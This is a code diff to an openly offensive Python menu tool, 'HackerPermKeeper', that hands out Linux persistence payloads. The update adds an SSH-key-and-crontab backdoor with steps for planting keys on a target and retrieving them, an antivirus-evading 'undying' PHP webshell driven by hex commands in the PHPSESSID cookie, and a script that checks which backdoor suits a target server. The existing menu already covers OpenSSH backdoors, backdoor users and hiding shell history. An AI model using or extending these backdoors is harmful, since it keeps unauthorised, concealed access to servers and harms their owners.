@@ -25,7 +25,7 @@ def Dowfile(input_files,file_name):
 def chooses():
     s = []
     i = 0
-    print(colored('HackerPermKeeper v2.0 弱鸡 支持以下漏洞检测 https://github.com/RuoJi6/HackerPermKeeper', 'green'))
+    print(colored('HackerPermKeeper v3.0 弱鸡 支持以下漏洞检测 https://github.com/RuoJi6/HackerPermKeeper', 'green'))
     print(colored('1--------------OpenSSH后门', 'yellow'),colored('[利用]', 'red'))
     print(colored('2--------------后门用户', 'yellow'),colored('[利用]', 'red'))
     print(colored('3--------------Alias后门', 'yellow'),colored('[利用]', 'red'))
@@ -36,10 +36,13 @@ def chooses():
     print(colored('8--------------Rootkit后门', 'yellow'),colored('[检测]', 'blue'))
     print(colored('9--------------不记录命令[history]', 'yellow'), colored('[利用]', 'red'))
     print(colored('10--------------ssh软链接&crontab', 'yellow'), colored('[利用]', 'red'))
+    print(colored('11--------------sshkey密钥&crontab', 'yellow'), colored('[利用]', 'red'))
+    print(colored('12--------------php权限维持不死免杀马', 'yellow'), colored('[利用]', 'red'))
+    print(colored('13--------------check检查脚本', 'yellow'), colored('[利用]', 'red'))
     print(colored('HackerPermKeeper[请输入多个模块序号, 一行一个，输入exit输出完成]', 'green'))
     while True:
         a = input(colored(f'[{i}]:', 'green'))
-        if a in ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10','exit']:
+        if a in ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10','11','12','13','exit']:
             i = i + 1
             if a != 'exit':
                 if a == str(1):
@@ -118,6 +121,45 @@ def chooses():
                     else:
                         print('输入错误')
                         break
+                    break
+                elif a == str(11):
+                    i = input('计划任务&ssk密钥后门：[1]使用/etc/文件维持 or [2]使用直接使用crontab命令维持:')
+                    if i == '1':
+                        i = input('生成未知：[1]本地机器生成 or [2]目标机器生成:')
+                        if i == '1':
+                            print(
+                                '生成之后，运行ssh-keygen -t ed25519 -N "admin!@#45123", -N为密码，注意需要把id_ed25519.pub，填入生成的文件id_ed25519_pub变量中,连接ssh -i id_ed25519 user@ip  如果连接报错，请输入chmod 600 id_ed25519')
+                            Dowfile('payload/11crontab_key/etc_cron/ect_cron_ssh_local.py', 'ect_cron_ssh_local.py')
+                        elif i =='2':
+                            print(
+                                '生成之后，修改文件中的password密码,在目标机器运行之后，下载/tmp/.11 密钥文件，连接ssh -i .11 root@ip  如果连接报错，请输入chmod 600 .11'
+                                '在对方服务器运行之后，下载/tmp/.11文件，这个文件就是密钥文件，下载之后可以删除，然后在连接')
+                            Dowfile('payload/11crontab_key/etc_cron/ect_cron_ssh_target.py', 'ect_cron_ssh_target.py')
+                        else:
+                            print('输入错误')
+                        break
+                    elif i == '2':
+                        i = input('生成未知：[1]本地机器生成 or [2]目标机器生成:')
+                        if i == '1':
+                            print(
+                                '生成之后，运行ssh-keygen -t ed25519 -N "admin!@#45123", -N为密码，注意需要把id_ed25519.pub，填入生成的文件id_ed25519_pub变量中,连接ssh -i id_ed25519 user@ip  如果连接报错，请输入chmod 600 id_ed25519')
+                            Dowfile('payload/11crontab_key/cron/cron_ssh_local.py', 'cron_ssh_local.py')
+                        elif i == '2':
+                            print(
+                                '生成之后，修改文件中的password密码,在目标机器运行之后，下载/tmp/.11 密钥文件，连接ssh -i .11 root@ip  如果连接报错，请输入chmod 600 .11'
+                                '在对方服务器运行之后，下载/tmp/.11文件，这个文件就是密钥文件，下载之后可以删除，然后在连接')
+                            Dowfile('payload/11crontab_key/etc_cron/cron_ssh_target.py', 'cron_ssh_target.py')
+                        else:
+                            print('输入错误')
+                        break
+                elif a == str(12):
+                    print('php权限维持不死免杀马，修改file为文件位置，使用命令为： Cookie:PHPSESSID=706870696e666f28293b[phpinfo]，十六进制字符串')
+                    Dowfile('payload/12phpwebshell/busu/bus.php', 'bus.php')
+                    break
+                elif a == str(13):
+                    print('check检查脚本[检测对方服务器适合什么类型的权限维持模块]')
+                    Dowfile('check/check.py', 'check.py')
+                    break
                 else:
                     print('Null')
                     break
